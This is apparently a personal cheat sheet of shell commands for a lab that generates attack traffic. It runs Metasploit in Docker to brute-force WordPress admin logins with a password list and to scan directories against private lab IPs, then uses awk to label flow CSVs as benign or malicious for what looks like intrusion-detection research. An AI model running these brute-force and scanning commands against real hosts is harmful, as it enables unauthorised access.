#Docker commands
docker run --tty --rm -e "TARGET_HOST=192.168.33.10" -e "TARGET_PORT=443" -e "SSLYZE_PATH=/usr/local/bin/sslyze" -v `pwd`/attacks:/data:z gallagher/gauntlt

docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data

# docker attach image as container
docker run -i -t <image:name> /bin/bash

#Metasploit docker image docker-framework assets location
/opt/metasploit/embedded/framework/data/

#Docker metasploit container, send commands as env
docker run \
  --rm -it -p 443:443 \
  -v ~/.msf4:/root/.msf4 \
  -v /tmp/msf:/tmp/data \
  -e TARGET_HOST=192.168.33.10 \
  -e MS_COMMAND="use auxiliary/scanner/http/wordpress_login_enum;set RHOSTS 192.168.33.10;set USERNAME admin;set PASS_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/adobe_top100_pass.txt;exploit;exit;" \
  automated-msattack-cmdasarg-03

#Same as above but in single line
docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data -e TARGET_HOST=10.0.2.6 -e MS_COMMAND="use auxiliary/scanner/http/dir_scanner; set RHOSTS 10.0.2.6; run; exit;" automated-msattack-cmdasarg-03

#Metasploit commands for docker container
use auxillary/scanner/http/wordpress_login_enum;
set RHOSTS 192.168.33.10;
set USERNAME admin;
set PASS_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/adobe_top100_pass.txt;
exploit;
exit;

#Run metasploit commands directly from teminal
msfconsole -q -x "use auxiliary/scanner/http/options;set RHOSTS 192.168.33.25;run;exit;"

#Check if filename aleady exists, if so then increment the filename by one
name=somefile
if [[ -e $name.ext ]] ; then
    i=0
    while [[ -e $name-$i.ext ]] ; do
        let i++
    done
    name=$name-$i
fi
touch "$name".ext

#awk commands
#1. test01
awk -v label="Benign" -v src_ip="10.0.2.4" -v dst_ip="10.0.2.6" '$2 != src_ip && $2 != dst_ip' FS=, OFS=, 09-08-2018.experiment01.unlabelled.csv > 09-08-2018.experiment01.labelled.csv

#if statement
awk -v label="Benign" -v src_ip="10.0.2.4" -v dst_ip="10.0.2.6" '{ if (($2 != src_ip && $2 != dst_ip) || ($4 != src_ip && $4 != dst_ip)) {$84=label}; print}' FS=, OFS=, 09-08-2018.experiment01.unlabelled.csv > 09-08-2018.experiment01.labelled.csv

#If else statement - modify label if one or more conditions are satisfied.
awk -v label_B="Benign" -v label_M="Malicious" -v src_ip="10.0.2.4" -v dst_ip="10.0.2.6" '{ if (($2 != src_ip && $2 != dst_ip) || ($4 != src_ip && $4 != dst_ip)) {$84=label_B}; else{$84=label_M}; print}' FS=, OFS=, 09-08-2018.experiment01.unlabelled.csv > 09-08-2018.experiment01.labelled.csv

awk -v label_B="Benign" -v label_M="Malicious" -v malicious_ip="10.0.2.4" -v benign_ip="10.0.2.7" '{ if ($2 == benign_ip && $3 == benign_ip) {$84=label_B}; else{$84=label_M}; print}' FS=, OFS=, bitflow_data/14-08-18.experiment.captured.pcap_Flow.csv > bitflow_data/14-08-18.experiment.labelled.pcap_Flow.csv
